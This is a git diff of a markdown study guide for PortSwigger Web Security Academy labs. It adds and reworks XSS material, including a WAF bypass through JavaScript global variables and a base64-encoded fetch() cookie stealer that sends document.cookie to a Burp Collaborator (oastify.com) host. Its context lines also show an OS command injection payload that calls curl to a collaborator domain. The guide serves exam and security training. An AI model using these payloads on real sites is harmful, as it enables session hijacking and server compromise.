@@ -91,7 +91,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 >Test which characters enable the escaping out of the `source code` injection point, by using the fuzzer string below.  
 
 ```
-<>\'\"<script>{{7*7}}$(alert(1)}fuzzer
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
 ```  
 
 >Review the `source code` to ***identify*** the **sources** , **sinks** or **methods** that may lead to exploit, list of samples:  
@@ -319,7 +319,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 [Reflected String XSS](#reflected-string-xss)  
 [Reflected String Extra Escape](#reflected-string-extra-escape)  
 [XSS Template Literal](#xss-template-literal)  
-[XSS WAF Bypass](#xss-waf-bypass)  
+[XSS via JSON into EVAL](#xss-via-json-into-eval)  
 [Stored XSS](#stored-xss)  
 [Stored DOM XSS](#stored-dom-xss)  
 [XSS in SVG Upload](#xss-svg-upload)  
@@ -358,11 +358,16 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 ```  
 
 ```
-<>\'\"<script>{{7*7}}$(alert(1)}fuzzer
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
 ```  
 
 >Submitting the above payloads may give response message, ***"Tag is not allowed"***. Then ***identify*** allowed tags using [PortSwigger Academy Methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).  
 
+>URL and Base64 online encoders and decoders  
+
++ [URL Decode and Encode](https://www.urldecoder.org/)  
++ [BASE64 Decode and Encode](https://www.base64encode.org/)  
+  
 >This lab gives great **Methodology** to ***identify*** allowed HTML tags and events for crafting POC XSS.  
 
 >Host **iframe** code on exploit server and deliver exploit link to victim.  
@@ -571,9 +576,19 @@ ${alert(document.cookie)}
 
 [PortSwigger Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)  
 
-### XSS WAF Bypass  
+### XSS via JSON into EVAL  
 
->WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  
+>This application is performing search function and the **DOM Invader** identify the sink in an ` eval()` function. The search results are placed into JSON content type.  
+
+![Dom Invader EVAL identify](images/dom-invader-eval-identify.png)  
+
+>To test escape of the `JSON` data and inject test payload `"-prompt(321)-"` in to JSON content.  
+
+![json-injection-escape.png](images/json-injection-escape.png)  
+
+>Attempting to get our own session cookie value with payload of `"-alert(document.cookie)-"` and filter message is returned stating `"Potentially dangerous search term"`.
+
+>WAF is preventing dangerous search filters and tags, then we bypass WAF filters using JavaScript global variables.  
 
 ```JavaScript
 "-alert(window["document"]["cookie"])-"
@@ -582,21 +597,26 @@ ${alert(document.cookie)}
 ```  
 
 [secjuice: Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
-  
-```JavaScript
-fetch("https://COLLABORATOR.NET/?c=" + btoa(document['cookie']))
-```
->Base64 encode the payload.  
 
-```
-ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
-```  
-
->Test payload on our own session in Search.  
+>Below is the main cookie stealer payload before BASE 64 encoding it.  
 
 ```JavaScript
-"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
+fetch(`https://4z4age0ypb5wob9p61yppu13vu1lpbd0.oastify.com/?jsonc=` + window["document"]["cookie"])
 ```  
+
+>[Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.  
+
+```
+ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==
+```  
+
+>Test payload on our own session cookie in Search function.  
+
+```JavaScript
+"-eval(atob("ZmV0Y2goYGh0dHBzOi8vNHo0YWdlMHlwYjV3b2I5cDYxeXBwdTEzdnUxbHBiZDAub2FzdGlmeS5jb20vP2pzb25jPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ=="))-"
+```  
+
+>Unpacking above payload assembly stages:  
 
 + Using the **eval()** method evaluates or executes an argument. 
 + Using **atob()** or **btoa()** is function used for encoding to and from base64 format strings.
@@ -606,7 +626,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   + setImmediate("code")
   + Function("code")()
   
->The image below shows Burp Collaborator receiving the victim cookie as a base64 result.  
+>This image shows Burp Collaborator receiving the victim cookie value.  
 
 ![Burp collaborator receiving request with base64 cookie value from our POC.](images/xss2.png)  
 
@@ -628,11 +648,6 @@ https://TARGET.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dl
 ```html
 https://TARGET.net/?SearchTerm="+eval(atob("fetch("https://COLLABORATOR.NET/?c=" + btoa(document['cookie']))"))}//  
 ```  
-  
-#### URL & Base64 encoders and decoders  
-
-[URL Decode and Encode](https://www.urldecoder.org/)  
-[BASE64 Decode and Encode](https://www.base64encode.org/)    
   
 ### Stored XSS
 
@@ -2863,6 +2878,11 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 >Obfuscation is the action of making something obscure, unclear, or unintelligible.  
 
+>URL and Base64 online encoders and decoders.  
+  
++ [URL Decode and Encode](https://www.urldecoder.org/)  
++ [BASE64 Decode and Encode](https://www.base64encode.org/)  
+  
 >URL replacing the period character ```.``` with encoded value of ```%2e```.  
 
 >Double-encode the injecting payload.  
